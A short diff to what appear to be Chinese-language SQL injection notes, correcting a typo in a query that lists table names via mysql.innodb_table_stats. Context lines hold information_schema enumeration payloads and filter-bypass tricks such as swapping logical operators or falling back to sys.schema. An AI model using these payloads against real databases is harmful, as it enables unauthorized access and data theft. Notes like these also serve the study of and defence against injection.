@@ -21,7 +21,7 @@ select(group_concat(table_name))from(information_schema.tables)where(table_schem
 用其他逻辑运算符and ， && ， &， |  ,1^1^
 查表名使用 
 ```
-select group_concat(table_name）from mysql.innodb_table_stats wheredatabase_name=database()
+select group_concat(table_name）from mysql.innodb_table_stats where database_name=database()
 ```
 如果information_schema被禁止，通过sys.schema获取当前数据库表名
 ```
